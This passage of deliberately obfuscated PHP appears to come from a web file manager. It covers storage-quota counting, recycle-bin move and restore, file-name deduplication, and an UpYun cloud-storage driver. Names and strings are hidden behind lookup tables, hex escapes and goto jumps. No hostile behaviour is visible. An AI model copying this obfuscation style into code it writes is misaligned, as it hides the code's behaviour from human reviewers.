$ĞÃÌŠæœ[534] => $¦Â‹×®Ş, $ĞÃÌŠæœ[448] => 0))->sum($ĞÃÌŠæœ[76]); $Ñ‚ÖÓ¿ = !$Ñ‚ÖÓ¿ || $Ñ‚ÖÓ¿ <= 0 ? 0 : $Ñ‚ÖÓ¿; Model($ĞÃÌŠæœ[542])->userEdit($¦Â‹×®Ş, array($ĞÃÌŠæœ[1850] => $Ñ‚ÖÓ¿)); } public function targetSpaceUpdate($Ø´œ°, $§‹µŸà‡) { $îÑ„š­Ó =& $_SERVER[”ú…±Ú¥]; if (!$§‹µŸà‡) { return; } if (!in_array($Ø´œ°, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Ïşñ¨ô = $this->targetSpaceSize($Ø´œ°, $§‹µŸà‡); if ($Ø´œ° == self::TYPE_USER) { Model($îÑ„š­Ó[542])->userEdit($§‹µŸà‡, array($îÑ„š­Ó[1850] => $Ïşñ¨ô)); } else { if ($Ø´œ° == self::TYPE_GROUP) { Model($îÑ„š­Ó[550])->groupEdit($§‹µŸà‡, array($îÑ„š­Ó[1850] => $Ïşñ¨ô)); } } } public function targetSpaceSize($ó»Å®·˜, $¤¯Í‹Ğß) { $åÁıª± =& $_SERVER[”ú…±Ú¥]; $Ñî£¿¤ö = 0; $¸ø„¢´Ï = $this->targetSourceRoot($ó»Å®·˜, $¤¯Í‹Ğß, !0); foreach ($¸ø„¢´Ï as $£ô¸°ûá) { if (!$£ô¸°ûá) { continue; } $Ñî£¿¤ö += floatval($£ô¸°ûá[$åÁıª±[76]]); $Ï¼†ì¥ = array($åÁıª±[618] => array($åÁıª±[578], $åÁıª±[559] . $£ô¸°ûá[$åÁıª±[440]] . $åÁıª±[579])); $†®è¿éÈ = Model($åÁıª±[467])->field($åÁıª±[455])->where($Ï¼†ì¥)->select(); $†®è¿éÈ = array_to_keyvalue($†®è¿éÈ, $åÁıª±[12], $åÁıª±[440]); $†®è¿éÈ = array_unique(array_filter($†®è¿éÈ)); if ($†®è¿éÈ) { $Ï¼†ì¥ = array($åÁıª±[455] => array($åÁıª±[456], $†®è¿éÈ)); $Ñî£¿¤ö += floatval($this->where($Ï¼†ì¥)->sum($åÁıª±[76])); } } $Ñî£¿¤ö = !$Ñî£¿¤ö || $Ñî£¿¤ö <= 0 ? 0 : $Ñî£¿¤ö; return $Ñî£¿¤ö; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($æÒ°–û) { return $this->fileTypeProfile($æÒ°–û, SourceModel::TYPE_USER); } public function groupFileTypeProfile($¹®‚Ñ¾) { return $this->fileTypeProfile($¹®‚Ñ¾, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ùà‰ıÔá, $å¨ñ•Ô) { $ıÂ˜Éùñ =& $_SERVER[”ú…±Ú¥]; $ÎŒêı°ß = $ıÂ˜Éùñ[2170] . $ùà‰ıÔá . $ıÂ˜Éùñ[11] . $å¨ñ•Ô; $ì¡¹š¥· = Cache::get($ÎŒêı°ß); if ($ì¡¹š¥·) { return $ì¡¹š¥·; } $ÓÌôœŠü = array($ıÂ˜Éùñ[612] => 0); if ($ùà‰ıÔá != !1) { $ÓÌôœŠü[$ıÂ˜Éùñ[534]] = $ùà‰ıÔá; $ÓÌôœŠü[$ıÂ˜Éùñ[449]] = $å¨ñ•Ô; } $‘’Ùñ® = array(); $‘’Ùñ®[$ıÂ˜Éùñ[2171]] = array($ıÂ˜Éùñ[2172] => LNG($ıÂ˜Éùñ[2171]), $ıÂ˜Éùñ[2173] => $this->where($ÓÌôœŠü)->count(), $ıÂ˜Éùñ[583] => $this->where($ÓÌôœŠü)->sum($ıÂ˜Éùñ[76])); $‘ÎŒÒş® = KodIO::fileTypeList(); foreach ($‘ÎŒÒş® as $²ñíß¤û => $ÆŠû±§Ü) { $ÓÌôœŠü[$ıÂ˜Éùñ[450]] = $this->fileTypeWhere($²ñíß¤û); $‘’Ùñ®[$²ñíß¤û] = array($ıÂ˜Éùñ[2172] => $ÆŠû±§Ü[$ıÂ˜Éùñ[32]], $ıÂ˜Éùñ[2173] => $this->where($ÓÌôœŠü)->count(), $ıÂ˜Éùñ[583] => $this->where($ÓÌôœŠü)->sum($ıÂ˜Éùñ[76])); } Cache::set($ÎŒêı°ß, $‘’Ùñ®, 1200); return $‘’Ùñ®; } public function fileNameExist($¦ª¼Êº®, $¼–¾ı») { $ƒæ“ÌËì =& $_SERVER[”ú…±Ú¥]; $‰ ÖÁ‹æ = $this->where(array($ƒæ“ÌËì[470] => $¦ª¼Êº®, $ƒæ“ÌËì[32] => $¼–¾ı», $ƒæ“ÌËì[469] => 0))->find(); return is_array($‰ ÖÁ‹æ) ? $‰ ÖÁ‹æ[$ƒæ“ÌËì[440]] : !1; } public function childList($²¿üá­ø) { $¡¬ÁÒ¶ =& $_SERVER[”ú…±Ú¥]; $§Û÷õ = $¡¬ÁÒ¶[2148] . $²¿üá­ø; if (isset(self::$cacheChildList[$§Û÷õ])) { return self::$cacheChildList[$§Û÷õ]; } $¾È…Ú ñ = array($¡¬ÁÒ¶[470] => intval($²¿üá­ø), $¡¬ÁÒ¶[469] => 0); $–ŒÌÄì = $this->where($¾È…Ú ñ)->select(); $–ŒÌÄì = $–ŒÌÄì ? $–ŒÌÄì : array(); self::$cacheChildList[$§Û÷õ] = $–ŒÌÄì; foreach ($–ŒÌÄì as $¸ææ®»Ğ) { $§Û÷õ = $¡¬ÁÒ¶[498] . $¸ææ®»Ğ[$¡¬ÁÒ¶[440]]; self::$cacheSourceInfo[$§Û÷õ] = $¸ææ®»Ğ; } return $–ŒÌÄì; } public function fileNameAuto($úÛ’ğµê, $¹Ç«ßğ, $œ­ÖÈË´ = REPEAT_RENAME, $ê€Ç¸Ä = false) { $¯¨ò‘Æ© =& $_SERVER[”ú…±Ú¥]; $ƒ­¾Í¼Ê = get_path_ext($¹Ç«ßğ); $öœÌõ˜‡ = $ƒ­¾Í¼Ê ? basename($¹Ç«ßğ, $¯¨ò‘Æ©[10] . $ƒ­¾Í¼Ê) . $¯¨ò‘Æ©[2174] . $ƒ­¾Í¼Ê : $¹Ç«ßğ . $¯¨ò‘Æ©[422]; $ úšİÑÕ = array($¯¨ò‘Æ©[470] => $úÛ’ğµê, $¯¨ò‘Æ©[469] => 0, $¯¨ò‘Æ©[32] => array($¯¨ò‘Æ©[421], $öœÌõ˜‡)); $™—ï®‡À = $this->field($¯¨ò‘Æ©[32])->where($ úšİÑÕ)->select(); $œóš’ × = array_to_keyvalue($™—ï®‡À, $¯¨ò‘Æ©[12], $¯¨ò‘Æ©[32]); return $this->fileNameAutoGet($œóš’ ×, $¹Ç«ßğ, $œ­ÖÈË´, $ê€Ç¸Ä); } public function fileNameAutoGet($©’Ä¸Æ¾, $ÙÃÉ¯…, $È‡šú”—, $‰¤õâÑà) { $éşÖüğµ =& $_SERVER[”ú…±Ú¥]; if ($È‡šú”— == REPEAT_REPLACE || !$©’Ä¸Æ¾ || !in_array_not_case($ÙÃÉ¯…, $©’Ä¸Æ¾) || $‰¤õâÑà && $È‡šú”— != REPEAT_RENAME_FOLDER) { return $ÙÃÉ¯…; } if ($È‡šú”— == REPEAT_SKIP) { return !1; } $Éğ§ñ®ˆ = $éşÖüğµ[10] . get_path_ext($ÙÃÉ¯…); $Éğ§ñ®ˆ = $Éğ§ñ®ˆ == $éşÖüğµ[10] || $‰¤õâÑà ? $éşÖüğµ[12] : $Éğ§ñ®ˆ; for ($á²ç³Õ³ = 1; $á²ç³Õ³ <= count($©’Ä¸Æ¾) + 1; $á²ç³Õ³++) { $ªÑöõ‰º = substr($ÙÃÉ¯…, 0, strlen($ÙÃÉ¯…) - strlen($Éğ§ñ®ˆ)); $„¶¥‡¤© = $ªÑöõ‰º . "\50{$á²ç³Õ³}\x29{$Éğ§ñ®ˆ}"; if (!in_array_not_case($„¶¥‡¤©, $©’Ä¸Æ¾)) { return $„¶¥‡¤©; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\x75\x72\x63\145\137\x72\x65\x63\x79\x63\154\x65"; protected $dataAuto = array(array("\143\x72\145\x61\164\x65\x54\x69\x6d\x65", "\x74\151\x6d\145", "\151\156\x73\145\162\x74", "\146\x75\156\x63\164\x69\x6f\156")); public function listData($Õƒ¿š€Í = false) { $ÁùÉÅôÇ =& $_SERVER[”ú…±Ú¥]; $Õƒ¿š€Í = $Õƒ¿š€Í ? $Õƒ¿š€Í : USER_ID; $ö›İ—´× = $this->where(array($ÁùÉÅôÇ[1662] => $Õƒ¿š€Í))->select(); return array_to_keyvalue($ö›İ—´×, $ÁùÉÅôÇ[12], $ÁùÉÅôÇ[440]); } public function moveToRecycle($ØÏ«×®) { $¹‡¡Ïï =& $_SERVER[”ú…±Ú¥]; $†àá²İ = Model($¹‡¡Ïï[1362]); $ÍšÕê‡· = $†àá²İ->sourceInfo($ØÏ«×®); if (!$ÍšÕê‡· || $ÍšÕê‡·[$¹‡¡Ïï[469]] == $¹‡¡Ïï[88]) { return; } $ò´‹ğ¸ª = array($¹‡¡Ïï[455] => $ØÏ«×®, $¹‡¡Ïï[1662] => USER_ID, $¹‡¡Ïï[614] => $ÍšÕê‡·[$¹‡¡Ïï[449]], $¹‡¡Ïï[615] => $ÍšÕê‡·[$¹‡¡Ïï[534]], $¹‡¡Ïï[618] => $ÍšÕê‡·[$¹‡¡Ïï[549]]); $this->add($ò´‹ğ¸ª); $this->recycleMove($ØÏ«×®, 1); if ($ÍšÕê‡·[$¹‡¡Ïï[448]] == $¹‡¡Ïï[88]) { $¡Å®˜ğõ = array($¹‡¡Ïï[618] => array($¹‡¡Ïï[578], $ÍšÕê‡·[$¹‡¡Ïï[549]] . $ØÏ«×® . $¹‡¡Ïï[579])); $†àá²İ->where($¡Å®˜ğõ)->setField($¹‡¡Ïï[469], 1); } } public function clear() { $this->remove(!1); } public function remove($ŠŸª×ø = false, $”ÌŞŸêç = false) { $÷şÔâíã =& $_SERVER[”ú…±Ú¥]; $”ÌŞŸêç = $”ÌŞŸêç ? $”ÌŞŸêç : USER_ID; $óŠÈ²¥Ó = Model($÷şÔâíã[1362]); $¬ËÇŞï = $this->listData($”ÌŞŸêç); $ŠŸª×ø = $ŠŸª×ø === !1 ? !1 : $ŠŸª×ø; $ÙÑ‰¼íØ = array(); foreach ($¬ËÇŞï as $Ê¢ú¨ïÌ) { if ($ŠŸª×ø != !1 && !in_array($Ê¢ú¨ïÌ, $ŠŸª×ø)) { continue; } $®§‘ÄÎ = $óŠÈ²¥Ó->sourceInfo($Ê¢ú¨ïÌ); $óŠÈ²¥Ó->remove($Ê¢ú¨ïÌ, !1); $Ïßæ©¬ = $®§‘ÄÎ[$÷şÔâíã[449]] . $÷şÔâíã[11] . $®§‘ÄÎ[$÷şÔâíã[534]]; $ÙÑ‰¼íØ[$Ïßæ©¬] = array($÷şÔâíã[614] => $®§‘ÄÎ[$÷şÔâíã[449]], $÷şÔâíã[534] => $®§‘ÄÎ[$÷şÔâíã[534]]); $this->where(array($÷şÔâíã[440] => $Ê¢ú¨ïÌ))->delete(); } foreach ($ÙÑ‰¼íØ as $º™ÖçÑ·) { $óŠÈ²¥Ó->targetSpaceUpdate($º™ÖçÑ·[$÷şÔâíã[449]], $º™ÖçÑ·[$÷şÔâíã[534]]); } } public function restore($äŠ¨êã° = false) { $’õ²ìÈ = $this->listData(); $this->_restoreSource($’õ²ìÈ, $äŠ¨êã°); } public function removeUserAll($üÔ÷·ŠÔ) { $this->remove(!1, $üÔ÷·ŠÔ); } private function _restoreSource($î‡Åè„Š, $‘úşÔÀÀ) { $û»ÈúË =& $_SERVER[”ú…±Ú¥]; $èè¼œ± = Model($û»ÈúË[1362]); $‘úşÔÀÀ = $‘úşÔÀÀ == !1 ? !1 : $‘úşÔÀÀ; if (!$î‡Åè„Š) { return !0; } $ÆØ€µ› = array(); foreach ($î‡Åè„Š as $ù÷¢’¥) { if ($‘úşÔÀÀ != !1 && !in_array($ù÷¢’¥, $‘úşÔÀÀ)) { continue; } $ã±„¥õÙ = $èè¼œ±->sourceInfo($ù÷¢’¥); $µî«®Œ² = $èè¼œ±->sourceInfo($ã±„¥õÙ[$û»ÈúË[470]]); if ($µî«®Œ²[$û»ÈúË[469]] == $û»ÈúË[88]) { continue; } $èè¼œ±->lockMoveStart($ù÷¢’¥); $this->recycleMove($ù÷¢’¥, 0); if ($ã±„¥õÙ[$û»ÈúË[448]] == $û»ÈúË[88]) { $Ã¤¡ßß¯ = array($û»ÈúË[618] => array($û»ÈúË[578], $ã±„¥õÙ[$û»ÈúË[549]] . $ù÷¢’¥ . $û»ÈúË[579])); $èè¼œ±->where($Ã¤¡ßß¯)->setField($û»ÈúË[469], 0); $this->restoreFolderChildren($ù÷¢’¥, $î‡Åè„Š); } $this->where(array($û»ÈúË[440] => $ù÷¢’¥))->delete(); $èè¼œ±->folderSizeReset($ã±„¥õÙ[$û»ÈúË[470]]); $ÆØ€µ›[] = $ã±„¥õÙ[$û»ÈúË[470]]; if ($ã±„¥õÙ[$û»ÈúË[448]] == $û»ÈúË[88]) { $ÆØ€µ›[] = $ù÷¢’¥; } $èè¼œ±->lockMoveEnd($ù÷¢’¥); } $èè¼œ±->updateModifyTime($ÆØ€µ›); } private function restoreFolderChildren($¤±ãÜÊ”, $Š©ã¢’Ï) { $îç‰ôÛ¿ =& $_SERVER[”ú…±Ú¥]; $ı‚øä¼ = Model($îç‰ôÛ¿[1362]); $ƒ•Í’Í = array($îç‰ôÛ¿[440] => array($îç‰ôÛ¿[7], array())); foreach ($Š©ã¢’Ï as $§æ“ÓŒ ) { if ($§æ“ÓŒ  == $¤±ãÜÊ”) { continue; } if (!$ı‚øä¼->isParentOf($¤±ãÜÊ”, $§æ“ÓŒ )) { continue; } $Ç£òø¿Ò = $ı‚øä¼->sourceInfo($§æ“ÓŒ ); if ($Ç£òø¿Ò[$îç‰ôÛ¿[448]] == $îç‰ôÛ¿[88]) { $ƒ•Í’Í[] = array($îç‰ôÛ¿[618] => array($îç‰ôÛ¿[578], $Ç£òø¿Ò[$îç‰ôÛ¿[549]] . $§æ“ÓŒ  . $îç‰ôÛ¿[579])); } else { $ƒ•Í’Í[$îç‰ôÛ¿[440]][1][] = $§æ“ÓŒ ; } } if (!$ƒ•Í’Í[$îç‰ôÛ¿[440]][1]) { unset($ƒ•Í’Í[$îç‰ôÛ¿[440]]); } if (!$ƒ•Í’Í) { return; } $ƒ•Í’Í[$îç‰ôÛ¿[440]][1] = array_unique($ƒ•Í’Í[$îç‰ôÛ¿[440]][1]); $ƒ•Í’Í[$îç‰ôÛ¿[1029]] = $îç‰ôÛ¿[1959]; $ı‚øä¼->where($ƒ•Í’Í)->setField($îç‰ôÛ¿[469], 1); } private function recycleMove($Ö½ãóá¥, $ı¼À›á« = 1) { $ÜçƒÁ‚ =& $_SERVER[”ú…±Ú¥]; $×“âÇĞ× = Model($ÜçƒÁ‚[1362]); $Ô¿¯³ = Model($ÜçƒÁ‚[2175]); $ö¯²Ş = array($ÜçƒÁ‚[440] => $Ö½ãóá¥); if ($ı¼À›á«) { $×“âÇĞ×->where($ö¯²Ş)->setField($ÜçƒÁ‚[469], 1); $Ô¿¯³->eventRecycle($Ö½ãóá¥, $ÜçƒÁ‚[2176]); } else { $åö…ğ³ = $×“âÇĞ×->where($ö¯²Ş)->find(); $×ÏÒ­ïï = $åö…ğ³[$ÜçƒÁ‚[448]] == $ÜçƒÁ‚[88]; $è£‹‡„á = $×“âÇĞ×->fileNameAuto($åö…ğ³[$ÜçƒÁ‚[470]], $åö…ğ³[$ÜçƒÁ‚[32]], REPEAT_RENAME_FOLDER, $×ÏÒ­ïï); if ($è£‹‡„á != $åö…ğ³[$ÜçƒÁ‚[32]]) { $×“âÇĞ×->rename($Ö½ãóá¥, $è£‹‡„á); } $×“âÇĞ×->where($ö¯²Ş)->setField($ÜçƒÁ‚[469], 0); $Ô¿¯³->eventRecycle($Ö½ãóá¥, $ÜçƒÁ‚[2177]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\56\163\157\165\162\143\x65\x53\x65\143\162\x65\x74\114\x69\x73\x74"; public $field = array("\x73\157\x75\x72\x63\x65\x49\104", "\x74\171\160\145\x49\x44", "\x63\162\145\141\164\x65\x55\163\145\x72"); } goto C†»À¹´‹Ü; eĞ£Ø’£½: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($æ­úªŒ, $½î§œ­Ï = 0) { parent::__construct(); $this->source = $æ­úªŒ; $this->sourceSize = $½î§œ­Ï; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ŞÙš’Òß = false) { return $this->sourceSize; } public function getContent($ùº±öéï = false) { return $this->fileSubstr($ùº±öéï, 0, $this->sourceSize); } public function fileSubstr($ºã…ªÊü = false, $ëàéˆœî = 0, $ö®“œ¹ = 0) { if (!$ö®“œ¹) { $ö®“œ¹ = $this->sourceSize; } $¡­ÍÌ¸ = $this->sourceSize - $ëàéˆœî; if ($ö®“œ¹ >= $¡­ÍÌ¸) { $ö®“œ¹ = $¡­ÍÌ¸; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ëàéˆœî, $ö®“œ¹); } if ($this->sourceType == self::TYPE_FILE) { if ($ö®“œ¹ <= 0) { return $_SERVER[”ú…±Ú¥][12]; } $ğİ¬õîÕ = ftell($this->source); fseek_64($this->source, $ğİ¬õîÕ + $ëàéˆœî); $¢²‡è¿Ÿ = @fread($this->source, $ö®“œ¹); fseek_64($this->source, $ğİ¬õîÕ); return $¢²‡è¿Ÿ; } } public function hashMd5($Í”°ÇÜ = false) { return md5($this->getContent()); } public static function hash($áÈá¡ˆô, $ ‹Ù²Ê• = 0) { $Ê “òæ = new PathDriverStream($áÈá¡ˆô, $ ‹Ù²Ê•); return $Ê “òæ->hashSimple($áÈá¡ˆô); } public static function md5($®èâ§¡Ú, $Å­õ†‹ = 0) { $ü²¼›É = new PathDriverStream($®èâ§¡Ú, $Å­õ†‹); return $ü²¼›É->hashMd5($®èâ§¡Ú); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\160\72\x2f\x2f\166\x30\56\x61\160\151\x2e\x75\160\171\x75\156\56\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($šÑˆÊ†) { parent::__construct(); $this->_init($šÑˆÊ†); } public function _init($ïöéØï†) { $€ıóÈÄ¡ =& $_SERVER[”ú…±Ú¥]; foreach ($ïöéØï† as $Ú§¾Î€ => $¬Ó¾¸•) { if (isset($this->{$Ú§¾Î€})) { $this->{$Ú§¾Î€} = $¬Ó¾¸•; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($€ıóÈÄ¡[1468] . LNG($€ıóÈÄ¡[1399])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ª¢íõº, $î¦¶îı½ = "\107\105\x54") { $†¬Ê«é =& $_SERVER[”ú…±Ú¥]; $¯¥€˜ëÛ = gmdate($†¬Ê«é[1432]); $Œ‚£¸¬ = base64_encode(hash_hmac($†¬Ê«é[1469], "{$î¦¶îı½}\x26{$ª¢íõº}\x26{$¯¥€˜ëÛ}", md5("{$this->userpass}"), !0)); $¹£Ø’í¤ = array("\x41\165\x74\150\157\x72\151\172\x61\x74\x69\x6f\156\72\x55\x50\x59\x55\x4e\40{$this->username}\x3a{$Œ‚£¸¬}", "\x44\141\164\145\x3a{$¯¥€˜ëÛ}"); return $¹£Ø’í¤; } public function ussRequest($´“æœ–ø, $ó„Ö™Ôâ = "\x47\105\x54", $ã‘Ê«åæ = false, $Š¢Âµ©İ = false, $î–õ±ú = false) { $İ½áÜ =& $_SERVER[”ú…±Ú¥]; $´“æœ–ø = trim($´“æœ–ø, $İ½áÜ[8]); $¨¾µ€àï = "\x2f{$this->bucket}\x2f{$´“æœ–ø}"; $£ğ¢²±Œ = $this->ussHeaders($¨¾µ€àï, $ó„Ö™Ôâ); if ($Š¢Âµ©İ) { $£ğ¢²±Œ = array_merge($£ğ¢²±Œ, $Š¢Âµ©İ); } $‰•Ê«¶ = url_request($this->endpoint . $¨¾µ€àï, $ó„Ö™Ôâ, $ã‘Ê«åæ, $£ğ¢²±Œ, $î–õ±ú); if (!$‰•Ê«¶) { return array($İ½áÜ[1241] => !1, $İ½áÜ[1231] => $İ½áÜ[1470]); } if (strtolower($ó„Ö™Ôâ) == $İ½áÜ[207] || in_array($‰•Ê«¶[$İ½áÜ[1241]], array($İ½áÜ[251], $İ½áÜ[1471]))) { $ã‘Ê«åæ = $‰•Ê«¶[$İ½áÜ[1472]]; } else { $ã‘Ê«åæ = json_decode($‰•Ê«¶[$İ½áÜ[1231]], !0); if (!$ã‘Ê«åæ) { $ã‘Ê«åæ = $‰•Ê«¶[$İ½áÜ[1231]]; } else { if (!$‰•Ê«¶[$İ½áÜ[782]] && isset($ã‘Ê«åæ[$İ½áÜ[1473]])) { $ã‘Ê«åæ = $ã‘Ê«åæ[$İ½áÜ[1473]]; } } } return array($İ½áÜ[1241] => $‰•Ê«¶[$İ½áÜ[782]], $İ½áÜ[1231] => $ã‘Ê«åæ); } public function mkfile($ïĞ¼÷Éæ, $‹¯ªŞ¹’ = '', $µïåõÜ = REPEAT_RENAME) { if ($this->setContent($ïĞ¼÷Éæ, $‹¯ªŞ¹’)) { return $this->getPathOuter($ïĞ¼÷Éæ); } return !1; } public function mkdir($åÈ˜ÛÇ³, $ã‡àïó¾ = REPEAT_SKIP) { $ÓáÂº†’ =& $_SERVER[”ú…±Ú¥]; $¹ç˜µúÚ = trim($åÈ˜ÛÇ³, $ÓáÂº†’[8]); if ($this->_isFolder($¹ç˜µúÚ)) { return $this->getPathOuter($¹ç˜µúÚ); } $ûµšÖó¾ = array($ÓáÂº†’[1474]); $´§º“àñ = $this->ussRequest($¹ç˜µúÚ, $ÓáÂº†’[236], !1, $ûµšÖó¾); return $´§º“àñ[$ÓáÂº†’[1241]] ? $this->getPathOuter($¹ç˜µúÚ) : !1; } public function copyFile($¼ƒûí», $Ïœ¼å¬ù) { $’¯Õ¥‰î =& $_SERVER[”ú…±Ú¥]; $âñĞ¸ÊÛ = array($’¯Õ¥‰î[1475] . "\x2f{$this->bucket}\x2f{$¼ƒûí»}", $’¯Õ¥‰î[1476]); $›”¬…ßÉ = $this->ussRequest($Ïœ¼å¬ù, $’¯Õ¥‰î[238], !1, $âñĞ¸ÊÛ); return $›”¬…ßÉ[$’¯Õ¥‰î[1241]] ? !0 : $this->getPathOuter($Ïœ¼å¬ù); } public function moveFile($ÇæÖËÚ, $íİ¬ì‚) { $Ó¹ëºÃ =& $_SERVER[”ú…±Ú¥]; $½„ğÏËÆ = array($Ó¹ëºÃ[1477] . "\57{$this->bucket}\x2f{$ÇæÖËÚ}", $Ó¹ëºÃ[1476]); $ÉÒÛ¹­Ó = $this->ussRequest($íİ¬ì‚, $Ó¹ëºÃ[238], !1, $½„ğÏËÆ); return $ÉÒÛ¹­Ó[$Ó¹ëºÃ[1241]] ? !0 : $this->getPathOuter($íİ¬ì‚); } public function delFile($×¥ºˆ¸) { $Àƒñü =& $_SERVER[”ú…±Ú¥]; $‹èö–¶‚ = $this->ussRequest($×¥ºˆ¸, $Àƒñü[1478]); return $‹èö–¶‚[$Àƒñü[1241]] ? !0 : !1; } public function delFolder($…¿½Ïöû) { $¦ÅÎÎÔ¡ =& $_SERVER[”ú…±Ú¥]; if (!$this->exist($…¿½Ïöû)) { return !0; } $this->listItemCache = !1; $ÀÌ…ÎÉå = $ËÌÓÆ¥Ğ = array(); $this->fileList($…¿½Ïöû, $ÀÌ…ÎÉå, $ËÌÓÆ¥Ğ, !0); $this->listItemCache = !0; foreach ($ËÌÓÆ¥Ğ as $¯ƒ½å¦) { $òæœàĞ÷ = $this->ussRequest($¯ƒ½å¦[$¦ÅÎÎÔ¡[32]], $¦ÅÎÎÔ¡[1478]); if (!$òæœàĞ÷[$¦ÅÎÎÔ¡[1241]]) { return !1; } } foreach ($ÀÌ…ÎÉå as $ñø²ÅÈ) { $òæœàĞ÷ = $this->ussRequest($ñø²ÅÈ, $¦ÅÎÎÔ¡[1478]); if (!$òæœàĞ÷[$¦ÅÎÎÔ¡[1241]]) { return !1; } } $òæœàĞ÷ = $this->ussRequest($…¿½Ïöû, $¦ÅÎÎÔ¡[1478]); return $òæœàĞ÷[$¦ÅÎÎÔ¡[1241]]; } public function rename($¥ŞŞåÆÒ, $ªÃ–©µ¢) { if ($this->isFile($¥ŞŞåÆÒ)) { $ªÃ–©µ¢ = get_path_father($¥ŞŞåÆÒ) . $ªÃ–©µ¢; return $this->moveFile($¥ŞŞåÆÒ, $ªÃ–©µ¢); } return $this->renameObject($¥ŞŞåÆÒ, $ªÃ–©µ¢); } public function fileInfo($ê•¤çò§, $ÛŸû’©• = false, $Ò–û²ÛÏ = array()) { $ÂÈ©•’‡ =& $_SERVER[”ú…±Ú¥]; $Ëá´Ë‰ = array($ÂÈ©•’‡[32] => $this->pathThis($ê•¤çò§), $ÂÈ©•’‡[84] => $this->getPathOuter($ÂÈ©•’‡[8] . $ê•¤çò§), $ÂÈ©•’‡[33] => $ÂÈ©•’‡[210], $ÂÈ©•’‡[76] => isset($Ò–û²ÛÏ[$ÂÈ©•’‡[76]]) ? $Ò–û²ÛÏ[$ÂÈ©•’‡[76]] : 0, $ÂÈ©•’‡[174] => $this->ext($ê•¤çò§)); if ($ÛŸû’©•) { return $Ëá´Ë‰; } $Ëá´Ë‰[$ÂÈ©•’‡[211]] = $Ëá´Ë‰[$ÂÈ©•’‡[85]] = 0; $Ëá´Ë‰[$ÂÈ©•’‡[212]] = $Ëá´Ë‰[$ÂÈ©•’‡[213]] = !0; if (empty($Ò–û²ÛÏ)) { $Ò–û²ÛÏ = $this->objectMeta($ê•¤çò§); if (!$Ò–û²ÛÏ) { return $Ëá´Ë‰; } } $Ëá´Ë‰[$ÂÈ©•’‡[211]] = intval($Ò–û²ÛÏ[$ÂÈ©•’‡[1479]]); $Ëá´Ë‰[$ÂÈ©•’‡[85]] = intval($Ò–û²ÛÏ[$ÂÈ©•’‡[1480]]); $Ëá´Ë‰[$ÂÈ©•’‡[76]] = $Ò–û²ÛÏ[$ÂÈ©•’‡[76]]; return $Ëá´Ë‰; } public function folderInfo($Ûòãœ™œ, $¬Û¢å€ = false) { $ÙÑÎïŠÈ =& $_SERVER[”ú…±Ú¥]; $ı¼¦¶ = array($ÙÑÎïŠÈ[32] => $this->pathThis($Ûòãœ™œ), $ÙÑÎïŠÈ[84] => $this->getPathOuter($ÙÑÎïŠÈ[8] . $Ûòãœ™œ), $ÙÑÎïŠÈ[33] => $ÙÑÎïŠÈ[75]); if ($¬Û¢å€) { return $ı¼¦¶; } $ı¼¦¶[$ÙÑÎïŠÈ[211]] = $ı¼¦¶[$ÙÑÎïŠÈ[85]] = 0; $ı¼¦¶[$ÙÑÎïŠÈ[212]] = $ı¼¦¶[$ÙÑÎïŠÈ[213]] = !0; if (empty($ïÇá‹éÒ)) { $ïÇá‹éÒ = $this->objectMeta($Ûòãœ™œ); if (!$ïÇá‹éÒ) { return $ı¼¦¶; } } $ı¼¦¶[$ÙÑÎïŠÈ[211]] = intval($ïÇá‹éÒ[$ÙÑÎïŠÈ[1479]]); $ı¼¦¶[$ÙÑÎïŠÈ[85]] = intval($ïÇá‹éÒ[$ÙÑÎïŠÈ[1480]]); return $ı¼¦¶; } private function listObjs($¨”›òÜŸ, $²Ÿ¾òÆ = 0, $ˆîû«º¿ = 1000) { $ÇµõÜËÀ =& $_SERVER[”ú…±Ú¥]; $î¡Â¬å  = array($ÇµõÜËÀ[1481], $ÇµõÜËÀ[1482] . $ˆîû«º¿); if ($²Ÿ¾òÆ) { $î¡Â¬å [] = $ÇµõÜËÀ[1483] . $²Ÿ¾òÆ; } $å¦†öåÓ = $this->ussRequest($¨”›òÜŸ, $ÇµõÜËÀ[240], !1, $î¡Â¬å ); return !$å¦†öåÓ[$ÇµõÜËÀ[1241]] ? !1 : $å¦†öåÓ[$ÇµõÜËÀ[1231]]; } private function fileList($ÈÅè©µ, &$‡÷í˜§, &$½™½ÌÀ, $Ÿ§½Ô´è = false) { $ËÑİ­›… =& $_SERVER[”ú…±Ú¥]; $¹òÛ›ÀÅ = $ËÑİ­›…[12]; $İíÌÕø = 1000; $¥ĞÚëâ¹ = rtrim($ÈÅè©µ, $ËÑİ­›…[8]) . $ËÑİ­›…[8]; while (!0) { check_abort(); $õ¶üĞşö = $this->listObjs($ÈÅè©µ, $¹òÛ›ÀÅ, $İíÌÕø); if (!$õ¶üĞşö) { return !1; } $¹òÛ›ÀÅ = isset($õ¶üĞşö[$ËÑİ­›…[1484]]) ? $õ¶üĞşö[$ËÑİ­›…[1484]] : $ËÑİ­›…[12]; $õ–Çõƒ¦ = isset($õ¶üĞşö[$ËÑİ­›…[1485]]) ? $õ¶üĞşö[$ËÑİ­›…[1485]] : array(); foreach ($õ–Çõƒ¦ as $ĞŠÔÀÂ™) { $ºªƒ®‘ª = $ĞŠÔÀÂ™[$ËÑİ­›…[33]] == $ËÑİ­›…[75] ? !0 : !1; $Ş÷¡˜ó‘ = ltrim($¥ĞÚëâ¹ . $ĞŠÔÀÂ™[$ËÑİ­›…[32]], $ËÑİ­›…[8]) . ($ºªƒ®‘ª ? $ËÑİ­›…[8] : $ËÑİ­›…[12]); $â‰ıÓù¨ = 